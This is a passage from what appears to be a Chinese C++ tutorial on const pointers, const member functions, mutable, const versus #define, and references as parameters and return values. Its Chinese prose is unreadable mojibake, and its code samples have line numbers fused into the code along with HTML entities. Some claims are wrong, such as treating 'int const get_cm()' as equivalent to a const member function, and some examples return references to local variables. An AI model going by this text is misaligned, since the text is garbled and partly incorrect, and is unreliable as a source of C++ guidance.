//é”™è¯¯å†™æ³• å¯¹äº Bï¼Œ const æŒ‡é’ˆ p å…¶æŒ‡å‘çš„å†…å­˜åœ°å€ä¸èƒ½å¤Ÿè¢«æ”¹å˜ï¼Œä½†å…¶å†…å®¹å¯ä»¥æ”¹å˜ã€‚ç®€ç§°å³å®šå‘ï¼Œå› ä¸º const ä½äº * å·çš„å³è¾¹ã€‚ 12345int a = 8;int * const p = &amp;a;*p = 9; // æ­£ç¡®å†™æ³•int b = 7;p = &amp;b; // é”™è¯¯å†™æ³• å¯¹äº Cï¼Œåˆ™æ˜¯ A å’Œ B åˆå¹¶çš„ç»“æœï¼Œå³ const p æŒ‡å‘çš„å†…å®¹å’ŒæŒ‡å‘çš„å†…å­˜åœ°å€éƒ½å·²å›ºå®šï¼Œä¸å¯æ”¹å˜ã€‚ 12int a = 8;const int * const p = &amp;a; å¯¹äº Aã€Bã€C ä¸‰ç§æƒ…å†µï¼Œæ ¹æ® const ä½äº * å·çš„ä½ç½®ä¸åŒï¼Œå¯ä»¥æ€»ç»“ä¸‰å¥ä¾¿äºè®°å¿†çš„è¯ï¼š å·¦å®šå€¼ï¼Œå³å®šå‘ï¼Œconst ä¿®é¥°ä¸å˜é‡ã€‚ const ä¿®é¥°ç±»æˆå‘˜å‡½æ•°const ä¿®é¥°ç±»æˆå‘˜å‡½æ•°ï¼Œå…¶ç›®çš„æ˜¯é˜²æ­¢æˆå‘˜å‡½æ•°ä¿®æ”¹è¢«è°ƒç”¨å¯¹è±¡çš„å€¼ï¼Œå¦‚æœæˆ‘ä»¬ä¸æƒ³ä¿®æ”¹ä¸€ä¸ªè°ƒç”¨å¯¹è±¡çš„å€¼ï¼Œæ‰€æœ‰çš„æˆå‘˜å‡½æ•°éƒ½åº”å½“å£°æ˜ä¸º const æˆå‘˜å‡½æ•°ï¼Œæ­¤æ—¶ const æœ¬è´¨ä¸Šä¿®é¥°çš„æ˜¯ this æŒ‡é’ˆã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œconst å…³é”®å­—ä¸èƒ½ä¸ static å…³é”®å­—åŒæ—¶ä½¿ç”¨ï¼Œå› ä¸º static å…³é”®å­—ä¿®é¥°é™æ€æˆå‘˜å‡½æ•°ï¼Œè€Œé™æ€æˆå‘˜å‡½æ•°ä¸å«æœ‰ this æŒ‡é’ˆï¼Œå³ä¸èƒ½å®ä¾‹åŒ–ï¼Œä½† const æˆå‘˜å‡½æ•°å¿…é¡»å…³è”æŸä¸€å¯¹è±¡å®ä¾‹ã€‚ 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;using namespace std;class Test {private: int _cm;public: Test() {} Test(int _m) : _cm(_m) {} int get_cm() const { // _cm = 10; æ˜¯é”™è¯¯å†™æ³•ï¼Œå¯¹è±¡çš„_cmå±æ€§å€¼ä¸èƒ½è¢«æ”¹å˜ return _cm; }};void Cmf(const Test &amp; _tt) { cout &lt;&lt; _tt.get_cm();}int main() { Test t(8); Cmf(t); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 18 ä¸Šé¢çš„ int get_cm() const {} å‡½æ•°ç”¨åˆ°äº† const æˆå‘˜å‡½æ•°ï¼Œå¦‚æœ int get_cm() {} å»æ‰ const ä¿®é¥°ï¼Œåˆ™ Cmf å‡½æ•°ä¼ é€’çš„ const _tt å³ä½¿æ²¡æœ‰æ”¹å˜å¯¹è±¡çš„å€¼ï¼Œç¼–è¯‘å™¨ä¹Ÿè®¤ä¸ºå‡½æ•° int get_cm() {} ä¼šæ”¹å˜å¯¹è±¡çš„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å°½é‡æŒ‰ç…§è¦æ±‚å°†æ‰€æœ‰çš„ä¸éœ€è¦æ”¹å˜å¯¹è±¡å†…å®¹çš„å‡½æ•°éƒ½ä½œä¸º const æˆå‘˜å‡½æ•°ã€‚ä¸‹è¿°ä¸¤ç§çš„å†™æ³•éƒ½æ˜¯åˆæ³•çš„ï¼Œæ•ˆæœéƒ½ä¸€æ ·ï¼ŒC++ ä¸­ä¸€èˆ¬å°† const å†™åœ¨å‡½æ•°çš„æœ«å°¾å¤„ã€‚ 123456int get_cm() const {}int const get_cm() {} å¦‚æœæœ‰ä¸ªæˆå‘˜å‡½æ•°æƒ³ä¿®æ”¹å¯¹è±¡ä¸­çš„æŸä¸€ä¸ªæˆå‘˜æ€ä¹ˆåŠï¼Ÿè¿™æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ mutable å…³é”®å­—ä¿®é¥°è¿™ä¸ªæˆå‘˜ï¼Œmutable çš„æ„æ€ä¹Ÿæ˜¯æ˜“å˜çš„ï¼Œå®¹æ˜“æ”¹å˜çš„æ„æ€ï¼Œè¢« mutable å…³é”®å­—ä¿®é¥°çš„æˆå‘˜å¯ä»¥å¤„äºä¸æ–­å˜åŒ–ä¸­ï¼Œå¦‚ä¸‹é¢çš„ä¾‹å­ï¼š 123456789101112131415161718192021222324#include &lt;iostream&gt;using namespace std;class Test {public: int _cm; mutable int _ct;public: Test(int _m, int _t) : _cm(_m), _ct(_t) {} void Kf() const { // ++_cm; é”™è¯¯å†™æ³• ++_ct; // æ­£ç¡®å†™æ³• }};int main() { Test t(8, 7); t.Kf(); cout &lt;&lt; t._cm &lt;&lt; " " &lt;&lt; t._ct &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 18 8 è¿™é‡Œåœ¨å‡½æ•° void Kf() const {} ä¸­å¯ä»¥é€šè¿‡ ++_ct; ä¿®æ”¹ _ct çš„å€¼ï¼Œä½†æ˜¯é€šè¿‡ ++_cm ä¿®æ”¹ _cm åˆ™ä¼šæŠ¥é”™ï¼Œå› ä¸º _cm æ²¡æœ‰ç”¨ mutable ä¿®é¥°ã€‚ const å’Œ #define çš„åŒºåˆ«C++ ä¸­ä¸ä½†å¯ä»¥ç”¨ #define å®šä¹‰å¸¸é‡è¿˜å¯ä»¥ç”¨ const å®šä¹‰å¸¸é‡ï¼Œä¾‹å¦‚ const int c = 5; â‰ˆ #define c 5ï¼Œå®ƒä»¬çš„åŒºåˆ«å¦‚ä¸‹ï¼š ç”¨ #define MAX 255 å®šä¹‰çš„å¸¸é‡æ˜¯æ²¡æœ‰ç±»å‹çš„ï¼Œæ‰€ç»™å‡ºçš„æ˜¯ä¸€ä¸ªç«‹å³æ•°ï¼Œç¼–è¯‘å™¨åªæ˜¯æŠŠæ‰€å®šä¹‰çš„å¸¸é‡å€¼ä¸æ‰€å®šä¹‰çš„å¸¸é‡çš„åå­—è”ç³»èµ·æ¥ï¼Œ#define æ‰€å®šä¹‰çš„å®å˜é‡åœ¨ç¼–è¯‘å™¨æ‰§è¡Œé¢„å¤„ç†çš„æ—¶å€™è¿›è¡Œæ›¿æ¢ï¼Œåœ¨ç¨‹åºä¸­ä½¿ç”¨åˆ°è¯¥å¸¸é‡çš„åœ°æ–¹éƒ½è¦è¿›è¡Œæ‹·è´æ›¿æ¢ ç”¨ const float MAX = 255; å®šä¹‰çš„å¸¸é‡æœ‰ç±»å‹åå­—ï¼Œå­˜æ”¾åœ¨å†…å­˜çš„é™æ€åŒºåŸŸä¸­ï¼Œåœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ const å˜é‡åªæœ‰ä¸€ä¸ªæ‹·è´ï¼Œè€Œ #define æ‰€å®šä¹‰çš„å®å˜é‡å´æœ‰å¤šä¸ªæ‹·è´ï¼Œæ‰€ä»¥å®å®šä¹‰åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­æ‰€æ¶ˆè€—çš„å†…å­˜è¦æ¯” const å˜é‡çš„å¤§å¾—å¤š ç”¨ #define å®šä¹‰çš„å¸¸é‡æ˜¯ä¸å¯ä»¥ç”¨æŒ‡é’ˆå˜é‡å»æŒ‡å‘çš„ï¼Œç”¨ const å®šä¹‰çš„å¸¸é‡æ˜¯å¯ä»¥ç”¨æŒ‡é’ˆå»æŒ‡å‘è¯¥å¸¸é‡çš„åœ°å€ ç”¨ #define å¯ä»¥å®šä¹‰ä¸€äº›ç®€å•çš„å‡½æ•°ï¼Œconst æ˜¯ä¸å¯ä»¥å®šä¹‰å‡½æ•° ç¼–è¯‘å™¨å¤„ç†æ–¹å¼ï¼š #define â€“ åœ¨ç¼–è¯‘å™¨çš„é¢„å¤„ç†é˜¶æ®µè¿›è¡Œå•çº¯çš„æ–‡æœ¬æ›¿æ¢ const â€“ åœ¨ç¼–è¯‘å™¨çš„ç¼–è¯‘é˜¶æ®µç¡®å®šå…¶å€¼ ç±»å‹æ£€æŸ¥ï¼š #define â€“ æ— ç±»å‹ï¼Œä¸è¿›è¡Œç±»å‹å®‰å…¨æ£€æŸ¥ï¼Œå¯èƒ½ä¼šäº§ç”Ÿæ„æƒ³ä¸åˆ°çš„é”™è¯¯ const â€“ æœ‰æ•°æ®ç±»å‹ï¼Œç¼–è¯‘æ—¶ä¼šè¿›è¡Œç±»å‹ä¸ä½œç”¨åŸŸæ£€æŸ¥ å†…å­˜ç©ºé—´ï¼š #define â€“ ä¸åˆ†é…å†…å­˜ï¼Œç»™å‡ºçš„æ˜¯ç«‹å³æ•°ï¼Œæœ‰å¤šå°‘æ¬¡ä½¿ç”¨å°±è¿›è¡Œå¤šå°‘æ¬¡æ›¿æ¢ï¼Œåœ¨å†…å­˜ä¸­ä¼šæœ‰å¤šä¸ªæ‹·è´ï¼Œæ¶ˆè€—å†…å­˜å¤§ const â€“ åœ¨é™æ€å­˜å‚¨åŒºä¸­åˆ†é…ç©ºé—´ï¼Œåœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­å†…å­˜ä¸­åªæœ‰ä¸€ä¸ªæ‹·è´ å…¶ä»–æ–¹é¢ï¼š åœ¨ç¼–è¯‘æ—¶ï¼Œç¼–è¯‘å™¨é€šå¸¸ä¸ä¸º const å¸¸é‡åˆ†é…å†…å­˜ç©ºé—´ï¼Œè€Œæ˜¯å°†å®ƒä»¬ä¿å­˜åœ¨ç¬¦å·è¡¨ä¸­ï¼Œè¿™ä½¿å¾—å®ƒæˆä¸ºä¸€ä¸ªç¼–è¯‘æœŸé—´çš„å¸¸é‡ï¼Œæ²¡æœ‰äº†å­˜å‚¨ä¸è¯»å†…å­˜çš„æ“ä½œï¼Œä½¿å¾—å®ƒçš„æ•ˆç‡ä¹Ÿå¾ˆé«˜ã€‚#define å®æ›¿æ¢åªä½œæ›¿æ¢ï¼Œä¸åšè®¡ç®—ï¼Œä¸åšè¡¨è¾¾å¼æ±‚è§£ å®å®šä¹‰çš„ä½œç”¨èŒƒå›´ä»…é™äºå½“å‰æ–‡ä»¶ï¼Œé»˜è®¤çŠ¶æ€ä¸‹ï¼Œconst å¸¸é‡åªåœ¨æ–‡ä»¶å†…æœ‰æ•ˆï¼Œå½“å¤šä¸ªæ–‡ä»¶ä¸­å‡ºç°äº†åŒåçš„ const å¸¸é‡æ—¶ï¼Œç­‰åŒäºåœ¨ä¸åŒæ–‡ä»¶ä¸­åˆ†åˆ«å®šä¹‰äº†ç‹¬ç«‹çš„å¸¸é‡ã€‚å¦‚æœæƒ³åœ¨å¤šä¸ªæ–‡ä»¶ä¹‹é—´å…±äº« const å¸¸é‡ï¼Œå¿…é¡»åœ¨å¸¸é‡å®šä¹‰ä¹‹å‰æ·»åŠ  extern å…³é”®å­—ï¼ˆåœ¨å£°æ˜å’Œå®šä¹‰æ—¶éƒ½è¦æ·»åŠ ï¼‰ C è¯­è¨€ä¸ C++ çš„ const å¯¹æ¯”C è¯­è¨€çš„ const å˜é‡ï¼š C è¯­è¨€ä¸­ const å˜é‡æ˜¯åªè¯»å˜é‡ï¼Œæœ‰è‡ªå·±çš„å†…å­˜ç©ºé—´ C è¯­è¨€ä¸­ï¼Œå¯ä»¥é€šè¿‡æ“ä½œæŒ‡é’ˆçš„æ–¹å¼æ¥ä¿®æ”¹ const å˜é‡çš„å€¼ C++ çš„ const å¸¸é‡ï¼š å¯èƒ½åˆ†é…å†…å­˜ç©ºé—´ï¼Œä¹Ÿå¯èƒ½ä¸åˆ†é…å†…å­˜ç©ºé—´ å½“ä½¿ç”¨ &amp; æ“ä½œç¬¦å– const å¸¸é‡çš„åœ°å€æ—¶ï¼Œä¼šåˆ†é…å†…å­˜ç©ºé—´ å½“ const å¸¸é‡ä¸ºå…¨å±€ï¼Œå¹¶ä¸”éœ€è¦åœ¨å…¶å®ƒæ–‡ä»¶ä¸­ä½¿ç”¨ï¼Œä¼šåˆ†é…å†…å­˜ç©ºé—´ å½“ const int &amp;a = 10;ï¼Œå³ const ä¿®é¥°å¼•ç”¨æ—¶ï¼Œä¹Ÿä¼šåˆ†é…å†…å­˜ç©ºé—´ æ³¨æ„ï¼šC++ ç¼–è¯‘å™¨è™½ç„¶å¯èƒ½ä¸º const å¸¸é‡åˆ†é…å†…å­˜ç©ºé—´ï¼Œä½†ä¸ä¼šä½¿ç”¨å…¶å†…å­˜ç©ºé—´ä¸­çš„å€¼ï¼ŒåŒæ—¶æ˜¯åœ¨ç¼–è¯‘å™¨çš„ç¼–è¯‘é˜¶æ®µåˆ†é…å†…å­˜ç©ºé—´ å¼•ç”¨ï¼ˆæ™®é€šå¼•ç”¨ï¼‰å˜é‡åå›é¡¾ å˜é‡åå®è´¨ä¸Šæ˜¯ä¸€æ®µè¿ç»­å†…å­˜ç©ºé—´çš„åˆ«åï¼Œæ˜¯ä¸€ä¸ªæ ‡å·ï¼ˆé—¨ç‰Œå·ï¼‰ ç¨‹åºä¸­é€šè¿‡å˜é‡æ¥ç”³è¯·å¹¶å‘½åå†…å­˜ç©ºé—´ é€šè¿‡å˜é‡çš„åç§°å¯ä»¥ä½¿ç”¨å†…å­˜ç©ºé—´ å¼•ç”¨çš„æ¦‚å¿µåœ¨ C++ ä¸­æ–°å¢åŠ äº†å¼•ç”¨çš„æ¦‚å¿µï¼š a) å¼•ç”¨å¯ä»¥çœ‹ä½œä¸€ä¸ªå·²å®šä¹‰å˜é‡çš„åˆ«å b) å¼•ç”¨çš„è¯­æ³•ï¼šType &amp; name = var; c) å¼•ç”¨ä½œä¸ºå‡½æ•°å‚æ•°å£°æ˜æ—¶ï¼Œä¸ä¼šè¿›è¡Œåˆå§‹åŒ– d) æ™®é€šå¼•ç”¨åœ¨å£°æ˜æ—¶å¿…é¡»ç”¨å…¶å®ƒçš„å˜é‡è¿›è¡Œåˆå§‹åŒ– 123456789101112131415161718#include &lt;iostream&gt;using namespace std;int main() {{ int a = 10; // ç¼–è¯‘å™¨åˆ†é…4ä¸ªå­—èŠ‚çš„å†…å­˜ç©ºé—´ï¼Œaæ˜¯å†…å­˜ç©ºé—´çš„åˆ«å int &amp;b = a; // bå°±æ˜¯açš„åˆ«åï¼Œå³bå¼•ç”¨äº†a a =11; // ç›´æ¥èµ‹å€¼ { int *p = &amp;a; *p = 12; printf("a %d \\n",a); } b = 14; printf("a:%d b:%d", a, b); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 12a 12a:14 b:14 å¼•ç”¨æ˜¯ C++ çš„æ¦‚å¿µå¼•ç”¨å±äº C++ ç¼–è¯‘å™¨å¯¹ C è¯­è¨€çš„æ‰©å±•ï¼Œä¸‹è¿°ä»£ç åœ¨ C è¯­è¨€ä¸­ä¸èƒ½é€šè¿‡ç¼–è¯‘ï¼Œè¿™é‡Œä¸è¦ç”¨ C è¯­è¨€çš„è¯­æ³•å»æ€è€ƒ b = 11ã€‚ 123456int main() { int a = 0; int &amp;b = a; b = 11; return 0;} å¼•ç”¨ä½œå‡½æ•°å‚æ•° æ™®é€šå¼•ç”¨åœ¨å£°æ˜æ—¶å¿…é¡»ç”¨å…¶å®ƒçš„å˜é‡è¿›è¡Œåˆå§‹åŒ–ï¼Œint &amp;a; è¿™æ ·çš„å†™æ³•æ˜¯é”™è¯¯çš„ï¼ˆåœ¨ç»“æ„ä½“å†…å£°æ˜é™¤å¤–ï¼‰ å¼•ç”¨ä½œä¸ºå‡½æ•°å‚æ•°å£°æ˜æ—¶ï¼Œä¸ä¼šè¿›è¡Œåˆå§‹åŒ– 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;using namespace std;struct Teacher { char name[64]; int age;};// pTæ˜¯æŒ‡å‘t1çš„æŒ‡é’ˆï¼Œè¿™é‡Œç›¸å½“äºä¿®æ”¹äº†t1void printfT(Teacher *pT) { cout &lt;&lt; pT-&gt;age &lt;&lt; endl; pT-&gt;age = 23;}// pTæ˜¯t1çš„åˆ«åï¼Œè¿™é‡Œç›¸å½“äºä¿®æ”¹äº†t1void printfT2(Teacher &amp; pT) { cout &lt;&lt; pT.age &lt;&lt; endl; pT.age = 33;}// pTå’Œt1çš„æ˜¯ä¸¤ä¸ªä¸åŒçš„å˜é‡ï¼Œè¿™é‡Œåªä¼šä¿®æ”¹pTå˜é‡ï¼Œä¸ä¼šä¿®æ”¹t1å˜é‡void printfT3(Teacher pT) { cout &lt;&lt; pT.age &lt;&lt; endl; pT.age = 43;}int main() { Teacher t1; t1.age = 35; // pTæ˜¯æŒ‡å‘t1çš„æŒ‡é’ˆ printfT(&amp;t1); printf("t1.age:%d \\n", t1.age); // pTæ˜¯t1çš„åˆ«å printfT2(t1); printf("t1.age:%d \\n", t1.age); // pTæ˜¯å½¢å‚ï¼Œç›¸å½“äºt1å¤åˆ¶ä¸€ä»½æ•°æ®ç»™pT ---&gt; pT = t1 printfT3(t1); printf("t1.age:%d \\n", t1.age); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12345635t1.age:2323t1.age:3333t1.age:33 å¼•ç”¨çš„ä½¿ç”¨æ„ä¹‰ å¼•ç”¨ä½œä¸ºå…¶å®ƒå˜é‡çš„åˆ«åè€Œå­˜åœ¨ï¼Œå› æ­¤åœ¨ä¸€äº›åœºåˆå¯ä»¥ä»£æ›¿æŒ‡é’ˆ å¼•ç”¨ç›¸å¯¹äºæŒ‡é’ˆæ¥è¯´ï¼Œå…·æœ‰æ›´å¥½çš„å¯è¯»æ€§å’Œå®ç”¨æ€§ ä½¿ç”¨å¼•ç”¨å’ŒæŒ‡é’ˆï¼Œåˆ†åˆ«å®ç°äº¤æ¢ä¸¤ä¸ªæ•°å­—çš„ C++ ä»£ç å¦‚ä¸‹ï¼š å¼•ç”¨çš„æœ¬è´¨åˆ†æ 1ï¼‰å¼•ç”¨åœ¨ C++ ä¸­çš„å†…éƒ¨å®ç°æ˜¯ä¸€ä¸ªå¸¸æŒ‡é’ˆï¼ŒType &amp; name --&gt; Type * const name 2ï¼‰C++ ç¼–è¯‘å™¨åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­ï¼Œä½¿ç”¨å¸¸æŒ‡é’ˆä½œä¸ºå¼•ç”¨çš„å†…éƒ¨å®ç°ï¼Œå› æ­¤å¼•ç”¨æ‰€å ç”¨çš„å†…å­˜ç©ºé—´å¤§å°ä¸æŒ‡é’ˆç›¸åŒ 3ï¼‰ä»ä½¿ç”¨çš„è§’åº¦çœ‹ï¼Œå¼•ç”¨ä¼šè®©äººè¯¯ä¼šå…¶åªæ˜¯ä¸€ä¸ªåˆ«åï¼Œæ²¡æœ‰è‡ªå·±çš„å†…å­˜ç©ºé—´ï¼Œè¿™æ˜¯ C++ ä¸ºäº†å®ç”¨æ€§è€Œåšå‡ºçš„ç»†èŠ‚éšè— 1234567891011121314151617181920#include &lt;iostream&gt;using namespace std;void func(int &amp;a) { a = 10;}void func(int *const a) { *a = 15;}int main() { int x = 5; func(x); cout &lt;&lt; x &lt;&lt; endl; // 10 func(&amp;x); cout &lt;&lt; x &lt;&lt; endl; // 15 return 0;} å‚è€ƒä¸Šè¿°ä»£ç ï¼Œå‡½æ•°å‚æ•°é—´æ¥èµ‹å€¼ï¼ˆæŒ‡é’ˆæ–¹å¼ï¼‰æˆç«‹çš„ä¸‰ä¸ªæ¡ä»¶å¦‚ä¸‹ï¼š a) å®šä¹‰ä¸¤ä¸ªå˜é‡ï¼ˆä¸€ä¸ªå®å‚ä¸€ä¸ªå½¢å‚ï¼‰ b) å»ºç«‹å…³è”ï¼Œå®å‚å–åœ°å€ä¼ ç»™å½¢å‚ c) ä½¿ç”¨ *a å½¢å‚å»é—´æ¥çš„ä¿®æ”¹å®å‚çš„å€¼ å¼•ç”¨åœ¨å®ç°ä¸Šï¼Œåªä¸è¿‡æ˜¯æŠŠé—´æ¥èµ‹å€¼æˆç«‹çš„ä¸‰ä¸ªæ¡ä»¶çš„åä¸¤æ­¥å’ŒäºŒä¸ºä¸€ï¼›å½“å®å‚ä¼ ç»™å½¢å‚å¼•ç”¨çš„æ—¶å€™ï¼Œæ˜¯ C++ ç¼–è¯‘å™¨å¸®ç¨‹åºå‘˜è‡ªåŠ¨å–äº†ä¸€ä¸ªå®å‚åœ°å€ä¼ ç»™äº†å½¢å‚å¼•ç”¨ï¼ˆå¸¸é‡æŒ‡é’ˆï¼‰ã€‚å½“æˆ‘ä»¬ä½¿ç”¨å¼•ç”¨è¯­æ³•çš„æ—¶ï¼Œä¸éœ€è¦å…³å¿ƒç¼–è¯‘å™¨å¼•ç”¨æ˜¯æ€ä¹ˆåšçš„ï¼›å½“æˆ‘ä»¬åˆ†æå¥‡æ€ªçš„è¯­æ³•ç°è±¡æ—¶ï¼Œæˆ‘ä»¬æ‰å»è€ƒè™‘ C++ ç¼–è¯‘å™¨æ˜¯æ€ä¹ˆåšçš„ã€‚ å‡½æ•°è¿”å›å€¼æ˜¯å¼•ç”¨å½“å‡½æ•°è¿”å›å€¼ä¸ºå¼•ç”¨æ—¶ï¼š è‹¥å‡½æ•°è¿”å›çš„æ˜¯æ ˆå˜é‡ï¼ˆå¦‚ä½œç”¨åŸŸåªåœ¨å‡½æ•°ä½“å†…çš„å˜é‡ï¼‰ï¼Œä¸èƒ½æˆä¸ºå…¶å®ƒå¼•ç”¨çš„åˆå§‹å€¼ï¼Œä¸èƒ½ä½œä¸ºå·¦å€¼ä½¿ç”¨ è‹¥å‡½æ•°è¿”å›çš„æ˜¯é™æ€å˜é‡æˆ–å…¨å±€å˜é‡ï¼Œå¯ä»¥æˆä¸ºå…¶ä»–å¼•ç”¨çš„åˆå§‹å€¼ï¼Œå³å¯ä½œä¸ºå³å€¼ä½¿ç”¨ï¼Œä¹Ÿå¯ä½œä¸ºå·¦å€¼ä½¿ç”¨ å‡½æ•°è¿”å›å€¼æ˜¯åŸºç¡€ç±»å‹å½“å¼•ç”¨12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;using namespace std;int getAA1() { int a; a = 10; return a;}int &amp; getAA2() { int a; a = 10; return a;}int * getAA3() { int a; a = 10; return &amp;a;}int main() { int a1 = getAA1(); int a2 = getAA2(); int &amp;a3 = getAA2(); int *a4 = getAA3(); cout &lt;&lt; "a1 = " &lt;&lt; a1 &lt;&lt; endl; cout &lt;&lt; "a2 = " &lt;&lt; a2 &lt;&lt; endl; cout &lt;&lt; "a3 = " &lt;&lt; a3 &lt;&lt; endl; // è¿™é‡Œç”¨å¼•ç”¨å»æ¥å—å‡½æ•°çš„è¿”å›å€¼ï¼Œç»“æœæ˜¯ä¸æ˜¯ä¹±ç ï¼Œå…³é”®æ˜¯çœ‹è¿”å›çš„å†…å­˜ç©ºé—´æ˜¯ä¸æ˜¯è¢«ç¼–è¯‘å™¨å›æ”¶äº† cout &lt;&lt; "a4 = " &lt;&lt; *a4 &lt;&lt; endl; // è¿™é‡Œç”¨å¼•ç”¨å»æ¥å—å‡½æ•°çš„è¿”å›å€¼ï¼Œç»“æœæ˜¯ä¸æ˜¯ä¹±ç ï¼Œå…³é”®æ˜¯çœ‹è¿”å›çš„å†…å­˜ç©ºé—´æ˜¯ä¸æ˜¯è¢«ç¼–è¯‘å™¨å›æ”¶äº† return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1234a1 = 10a2 = 10a3 = 10 æˆ–è€… a3 = ä¹±ç a4 = 10 æˆ–è€… a4 = ä¹±ç  å‡½æ•°è¿”å›å€¼æ˜¯ static å˜é‡å½“å¼•ç”¨å€¼å¾—ä¸€æçš„æ˜¯ï¼Œstatic å…³é”®å­—ä¿®é¥°å˜é‡çš„æ—¶å€™ï¼Œå˜é‡æ˜¯ä¸€ä¸ªçŠ¶æ€å˜é‡ã€‚ 12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;using namespace std;int j() { static int a = 10; a++; printf("a:%d \\n", a); return a;}int &amp; j1() { static int a = 10; a++; printf("a:%d \\n", a); return a;}int * j2() { static int a = 15; a++; printf("a:%d \\n", a); return &amp;a;}int main() { // é”™è¯¯å†™æ³•ï¼Œj()çš„è¿ç®—ç»“æœæ˜¯ä¸€ä¸ªæ•°å€¼ï¼Œæ²¡æœ‰å†…å­˜åœ°å€ï¼Œä¸èƒ½å½“å·¦å€¼ï¼Œç±»ä¼¼ 11 = 100; // j() = 3; //å½“è¢«è°ƒç”¨çš„å‡½æ•°å½“å·¦å€¼çš„æ—¶å€™ï¼Œå¿…é¡»è¿”å›ä¸€ä¸ªå¼•ç”¨ j1() = 100; j1(); *(j2()) = 200; j2(); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1234a:11a:101a:16a:201 å‡½æ•°è¿”å›å€¼æ˜¯å½¢å‚å½“å¼•ç”¨12345678910111213141516171819202122#include &lt;iostream&gt;using namespace std;int g1(int *p) { *p = 100; return *p;}int &amp; g2(int *p) { *p = 100; return *p;}int main() { int a1 = 10; a1 = g2(&amp;a1); int &amp;a2 = g2(&amp;a1); printf("a1:%d \\n", a1); printf("a2:%d \\n", a2); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12a1:100a2:100 å‡½æ•°è¿”å›å€¼æ˜¯éåŸºç¡€ç±»å‹å¦‚æœå‡½æ•°è¿”å›çš„å¼•ç”¨ä¸æ˜¯åŸºç¡€ç±»å‹ï¼Œè€Œæ˜¯ä¸€ä¸ªç±»ï¼Œé‚£ä¹ˆæ­¤æ—¶çš„æƒ…å†µéå¸¸å¤æ‚ï¼Œæ¶‰åŠåˆ° copy æ„é€ å‡½æ•°å’Œ = æ“ä½œé‡è½½çš„çŸ¥è¯†å†…å®¹ï¼Œè¿™é‡Œæš‚æ—¶ä¸å±•å¼€è®¨è®ºã€‚ 123456789101112#include &lt;iostream&gt;using namespace std;struct Teachar { char name[64]; int age;};struct Teachar &amp; OpTeacher(struct Teachar &amp;t1) {} æŒ‡é’ˆå¼•ç”¨12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;#include &lt;string.h&gt;using namespace std;struct Teacher { char name[64]; int age;};// äºŒçº§æŒ‡é’ˆä½œå‡½æ•°å‚æ•°int getTe(Teacher **myp) { Teacher *p = (Teacher *) malloc(sizeof(Teacher)); if (p == NULL) { return -1; } memset(p, 0, sizeof(Teacher)); p-&gt;age = 33; *myp = p; return 0;}// æŒ‡é’ˆå¼•ç”¨ä½œå‡½æ•°å‚æ•°int getTe2(Teacher *&amp;myp) { myp = (Teacher *) malloc(sizeof(Teacher)); if (myp == NULL) { return -1; } myp-&gt;age = 34; return 0;}int main() { Teacher *p = NULL; getTe(&amp;p); printf("age:%d \\n", p-&gt;age); Teacher *pp = NULL; getTe2(pp); printf("age:%d \\n", pp-&gt;age); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12age:33age:34 å¸¸å¼•ç”¨ä½¿ç”¨å˜é‡åˆå§‹åŒ– const å¼•ç”¨åœ¨ C++ ä¸­å¯ä»¥å£°æ˜ const å¼•ç”¨ï¼Œä¾‹å¦‚ const Type &amp; name = var;ï¼Œå…¶ä¸­çš„ const å¼•ç”¨è®©å˜é‡æ‹¥æœ‰åªè¯»å±æ€§ã€‚ 12345678910111213141516171819#include &lt;iostream&gt;using namespace std;int main() { int a = 10; const int &amp;b = a; // b = 11; æ˜¯é”™è¯¯å†™æ³•ï¼Œè¿™é‡Œä¸èƒ½é€šè¿‡å¼•ç”¨æ”¹å˜açš„å€¼ï¼Œæ— æ³•é€šè¿‡ç¼–è¯‘ // åªèƒ½ç”¨æŒ‡é’ˆæ¥æ”¹å˜å¼•ç”¨çš„å€¼ int * p = (int*) &amp;b; *p = 11; printf("a:%d\\n", a); printf("b:%d\\n", b); printf("&amp;a:%d\\n", &amp;a); printf("&amp;b:%d\\n", &amp;b); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 1234a:11b:11&amp;a:1323872140&amp;b:1323872140 1234567891011121314151617181920212223242526#include &lt;iostream&gt;using namespace std;struct Teacher { char name[64]; int age;};// constå¼•ç”¨è®©å˜é‡(æ‰€æŒ‡å†…å­˜ç©ºé—´)æ‹¥æœ‰åªè¯»å±æ€§void printTe(const Teacher &amp;t) { // t.age = 11; æ˜¯é”™è¯¯å†™æ³•ï¼Œæ— æ³•é€šè¿‡ç¼–è¯‘}// const ä¿®é¥°æŒ‡é’ˆå’ŒæŒ‡é’ˆæŒ‡å‘çš„å†…å®¹ï¼Œé‚£ä¹ˆæŒ‡é’ˆæŒ‡å‘çš„å†…å®¹éƒ½ä¸èƒ½æ›´æ”¹void printTe2(const Teacher *const pt) { // pt-&gt;age = 11; æ˜¯é”™è¯¯å†™æ³•ï¼Œæ— æ³•é€šè¿‡ç¼–è¯‘}int main() { Teacher t1; t1.age = 33; printTe(t1); 